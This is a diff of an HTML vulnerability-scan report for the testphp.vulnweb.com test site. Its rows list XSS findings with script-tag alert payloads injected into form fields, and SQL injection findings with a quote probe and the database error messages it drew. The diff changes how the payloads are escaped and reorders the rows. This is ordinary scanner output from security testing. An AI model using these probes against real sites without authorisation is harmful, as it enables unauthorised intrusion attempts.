@@ -23,8 +23,8 @@
 <tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|POST|XSS </b></td>
 <td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/search.php?test=query </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[searchFor=<script>alert(123);</script>, goButton=go] </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[searchFor=<script>alert(123);</script>, goButton=go]</b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[searchFor=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), goButton=go] </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[searchFor=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), goButton=go]</b></td>
  </tr>
 <tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|GET|Blind SQL Injection </b></td>
@@ -39,22 +39,16 @@
 <td style="padding-right: 100px; border: 1px solid black;"><b>You have an error in your SQL syntax</b></td>
  </tr>
 <tr>
+<td style="padding-right: 100px; border: 1px solid black;"><b>|POST|XSS </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/secured/newuser.php </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[uuname=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), upass=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), upass2=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), urname=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), ucc=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), uemail=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), uphone=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), uaddress=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), signup=signup] </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[uuname=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), upass=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), upass2=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), urname=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), ucc=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), uemail=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), uphone=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), uaddress=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), signup=signup]</b></td>
+ </tr>
+<tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|GET|SQL Injection </b></td>
 <td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/artists.php?artist=2 </b></td>
 <td style="padding-right: 100px; border: 1px solid black;"><b>[artist=2',  = ] </b></td>
 <td style="padding-right: 100px; border: 1px solid black;"><b>mysql_fetch_array() expects parameter 1 to be resource, boolean given in</b></td>
- </tr>
-<tr>
-<td style="padding-right: 100px; border: 1px solid black;"><b>|POST|XSS </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/secured/newuser.php </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[uuname=<script>alert(123);</script>, upass=<script>alert(123);</script>, upass2=<script>alert(123);</script>, urname=<script>alert(123);</script>, ucc=<script>alert(123);</script>, uemail=<script>alert(123);</script>, uphone=<script>alert(123);</script>, uaddress=<script>alert(123);</script>, signup=signup] </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[uuname=<script>alert(123);</script>, upass=<script>alert(123);</script>, upass2=<script>alert(123);</script>, urname=<script>alert(123);</script>, ucc=<script>alert(123);</script>, uemail=<script>alert(123);</script>, uphone=<script>alert(123);</script>, uaddress=<script>alert(123);</script>, signup=signup]</b></td>
- </tr>
-<tr>
-<td style="padding-right: 100px; border: 1px solid black;"><b>|GET|Blind SQL Injection </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/artists.php?artist=2 </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[artist=2] </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>Incorrect syntax near</b></td>
  </tr>
 <tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|GET|SQL Injection </b></td>
@@ -65,8 +59,14 @@
 <tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|GET|XSS </b></td>
 <td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/hpp/params.php?p=valid&amp;pp=12 </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[p=valid<script>alert(123);</script>, pp=12<script>alert(123);</script>,  = ] </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[p=valid<script>alert(123);</script>, pp=12<script>alert(123);</script>,  = ]</b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[p=valid(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), pp=12(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose),  = ] </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[p=valid(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), pp=12(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose),  = ]</b></td>
+ </tr>
+<tr>
+<td style="padding-right: 100px; border: 1px solid black;"><b>|GET|Blind SQL Injection </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/artists.php?artist=2 </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[artist=2] </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>Incorrect syntax near</b></td>
  </tr>
 <tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|GET|Blind SQL Injection </b></td>
@@ -77,8 +77,14 @@
 <tr>
 <td style="padding-right: 100px; border: 1px solid black;"><b>|GET|XSS </b></td>
 <td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/hpp/?pp=12 </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[pp=12script"><script>alert(1)</script>,  = ] </b></td>
-<td style="padding-right: 100px; border: 1px solid black;"><b>[pp=12script"><script>alert(1)</script>,  = ]</b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[pp=12script"(tagClose)(tagOpen)script(tagClose)alert(1)(tagOpen)/script(tagClose),  = ] </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[pp=12script"(tagClose)(tagOpen)script(tagClose)alert(1)(tagOpen)/script(tagClose),  = ]</b></td>
+ </tr>
+<tr>
+<td style="padding-right: 100px; border: 1px solid black;"><b>|POST|XSS </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>http://testphp.vulnweb.com/guestbook.php </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[name=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), text=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), submit=add+message] </b></td>
+<td style="padding-right: 100px; border: 1px solid black;"><b>[name=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), text=(tagOpen)script(tagClose)alert(123);(tagOpen)/script(tagClose), submit=add+message]</b></td>
  </tr>
         </table>
     </div>
